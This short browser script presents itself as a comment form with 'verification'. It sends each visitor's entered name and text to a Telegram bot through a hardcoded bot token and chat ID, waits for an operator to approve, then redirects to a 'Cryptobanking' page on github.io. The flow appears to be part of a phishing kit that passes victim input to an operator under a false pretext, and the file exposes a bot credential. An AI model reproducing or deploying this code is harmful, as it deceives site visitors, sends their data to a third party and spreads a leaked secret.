const BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
const CHAT_ID = "8468538314";

let lastUpdateId = 0;

async function submitComment(){
    const username = document.getElementById("username").value.trim();
    const comment = document.getElementById("comment").value.trim();
    const status = document.getElementById("status");

    if(!username || !comment){
        alert("Please fill all fields.");
        return;
    }

    status.innerText = "Verification in progress...";

    // Send message with inline buttons
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `New Comment\n\nName: ${username}\nComment: ${comment}`,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `approve_${username}` },
                        { text: "❌ Reject", callback_data: `reject_${username}` }
                    ]
                ]
            }
        })
    });

    monitorApproval(username);
}

function monitorApproval(username){
    const status = document.getElementById("status");

    const interval = setInterval(async () => {

        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}`);
        const data = await res.json();

        if(data.result.length > 0){
            data.result.forEach(update => {

                lastUpdateId = update.update_id;

                if(update.callback_query){
                    const dataValue = update.callback_query.data;

                    if(dataValue === `approve_${username}`){
                        clearInterval(interval);
                        window.location.href = "https://cryptobanki28.github.io/Cryptobanking/Cryptobanking2.html";
                    }

                    if(dataValue === `reject_${username}`){
                        clearInterval(interval);
                        status.innerText = "Verification Failed ❌";
                    }
                }
            });
        }

    }, 4000);
}